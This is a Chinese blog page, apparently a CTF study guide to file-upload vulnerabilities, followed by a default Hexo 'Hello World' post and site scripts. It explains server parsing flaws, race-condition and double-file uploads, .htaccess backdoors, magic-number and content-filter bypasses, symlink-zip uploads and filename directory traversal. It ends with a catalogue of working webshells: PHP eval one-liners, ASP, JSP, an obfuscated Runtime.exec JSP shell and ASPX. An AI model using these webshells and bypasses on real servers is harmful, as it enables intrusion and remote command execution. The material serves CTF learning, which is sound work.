</ul>
</blockquote>
<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析 #"></a>文件解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>形式：<code>www.xxx.com/xxx.asp;.jpg</code></li>
<li>原理：服务器默认不解析<code>;</code>后面的内容，因此<code>xxx.asp;jpg</code>被解析为<code>xxx.asp</code>文件了</li>
</ul>
</blockquote>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞 #"></a>Apache解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>

<p>1</p>
<p>常用后缀：<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
<blockquote>
<ul>
<li>例如：<code>shell.php.qwe.asd</code> -&gt;<code>shell.php</code></li>
</ul>
</blockquote>
<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞 #"></a>Nginx解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置<strong>SCRIPT_FILENAME</strong>。当访问<code>www.xxx.com/phpinfo.jpg/1.php</code>这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。</p>
<p>原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。</p>
</blockquote>
<p>攻击方式</p>
<blockquote>
<ul>
<li>形式： <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></li>
<li>另一种方法：上传一个名字为test.jpg，然后访问<code>test.jpg/.php</code>,在这个目录下就会生成一句话木马shell.php。</li>
</ul>
</blockquote>
<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞 #"></a>IIS7.5解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 <strong>cgi.fix_pathinfo</strong>，而这并不是nginx或者iis7.5本身的漏洞。</p>
</blockquote>
<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击 #"></a>竞争条件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
<p>攻击方法：</p>
<blockquote>
<ul>
<li>攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传</li>
</ul>
</blockquote>
<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传 #"></a>双文件上传 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">#</a></h3><p>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。</p>
<p>利用方式：</p>
<blockquote>
<ul>
<li>在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：<code>xxx.asp/xxx.php</code></li>
<li>补全url：<code>https://www.xxx.com/xxx.php(asp)</code></li>
<li>构造本地post提交表单</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>利用时只需要修改action的值为指定上传页面即可</p>
<ul>
<li>第一个文件上传允许的文件类型（<code>.jpg</code> <code>.png</code> <code>.gif</code> 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。</li>
</ul>
</blockquote>
<h3 id="php3457"><a href="#php3457" class="headerlink" title="php3457 #"></a>php3457 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457">#</a></h3><blockquote>
<p>该项为apache专属。关键点在<code>/etc/apache2/mods-available/php5.6.conf</code>这个文件，满足<code>.+\.ph(p[3457]?|t|tml)$</code>，都会被当作php文件解析。</p>
<p>在apache2目录下<code>grep -r x-httpd-php /etc/apache2</code>找到对应文件就能知道解析哪些后缀。</p>
</blockquote>
<h3 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击 #"></a>.htaccess文件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
</blockquote>
<p>一般<code>.htaccess</code>可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个<code>.htaccess</code>文件即可。</p>
<p>绕过方法：</p>
<blockquote>
<ul>
<li>针对黑名单绕过</li>
</ul>
<p>创建一个txt文件，写入</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>



<p>另存为 <code>.htaccess</code> 名称，保存类型为所有文件，即可将<code>png</code>文件解析为<code>php</code>文件。</p>
<ul>
<li>留后门</li>
</ul>
<p>在<code>.htaccess</code> 内写入<code>php</code>解析规则，类似于把文件名包含<code>s</code>的解析成<code>php</code>文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p><code>shell.png</code> 就会以<code>php</code>文件执行</p>
<ul>
<li>利用.htaccess进行文件包含</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>使用#注释使得.htaccess能够成功解析</li>
</ul>
</blockquote>
<h3 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测） #"></a>服务器检测（文件内容检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B">#</a></h3><h4 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头） #"></a>文件幻数检测（文件开头） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4">#</a></h4><blockquote>
<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
</blockquote>
<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>



<p>在文件幻数后面加上自己的WebShell代码就行</p>
<h4 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测 #"></a>文件相关信息检测 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B">#</a></h4><p>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<blockquote>
<ul>
<li>例如下面结构</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>


</blockquote>
<p>另一种是判断是否包含<code>&lt;?</code>或者<code>php</code></p>
<blockquote>
<ul>
<li><p>绕过<code>&lt;?</code>：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>绕过<code>php</code>：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<p>绕过方法：</p>
<blockquote>
<ul>
<li>对渲染&#x2F;加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。</li>
<li>对二次渲染的攻击方式就是攻击文件加载器自身。例如：</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数</span><br><span class="line">上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数</span><br></pre></td></tr></table></figure>



<p>某后台调用GD库对图像进行二次渲染的代码</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //函数名变成imageCreateFrompng 之类</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //变成imagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</li>
</ul>
</blockquote>
<h3 id="文件上传中的目录穿越漏洞"><a href="#文件上传中的目录穿越漏洞" class="headerlink" title="文件上传中的目录穿越漏洞 #"></a>文件上传中的目录穿越漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E">#</a></h3><p>攻击方式</p>
<blockquote>
<p>形式：上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p>
<p>绕过：上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p>
</blockquote>
<h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码 #"></a>攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h2><h2 id="文件压缩："><a href="#文件压缩：" class="headerlink" title="文件压缩："></a>文件压缩：</h2><p>软链接压缩包，然后上传到软链接下，放🐎进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html web  #创建软链接文件夹</span><br><span class="line">zip -y zip.zip web   #将软链接压缩生成一个zip.zip</span><br><span class="line"></span><br><span class="line">再在web下面放一个shell.php（🐎） </span><br><span class="line">zip -y z.zip web   #再生成一个带🐎的压缩包</span><br><span class="line"></span><br><span class="line">然后上传zip.zip，将上传路径改到可控目录/var/www/html</span><br><span class="line">然后上传z.zip，即传到了，显示的网页下（var/www/html/shell.php）</span><br><span class="line">蚁剑</span><br></pre></td></tr></table></figure>



<h3 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码 #"></a>常用攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>简单的一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>



<p>绕过<code>&lt;?</code>限制的一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>



<p>asp一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure>



<p>JSP一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>

<p>JSP一句话免杀（ASCLL编码）</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>ASPX一句话</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>1</p>
</blockquote>
<h3 id="其它攻击代码"><a href="#其它攻击代码" class="headerlink" title="其它攻击代码 #"></a>其它攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>异或取反等操作写shell的php脚本、混淆木马、不死马。</p>
</blockquote>
<h2 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考 #"></a>更多参考 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83">#</a></h2><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec">https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253698.html">https://www.freebuf.com/articles/web/253698.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/08/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="星河风">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-08 07:59:16" itemprop="dateCreated datePublished" datetime="2023-10-08T07:59:16+08:00">2023-10-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-10 18:45:09" itemprop="dateModified" datetime="2023-10-10T18:45:09+08:00">2023-10-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  



  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="chleynx"
      src="/images/ch.jpg">
  <p class="site-author-name" itemprop="name">chleynx</p>
  <div class="site-description" itemprop="description">不是看到希望才坚持，而是坚持了才能看到希望</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/c582037" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-10-8 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chleynx</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
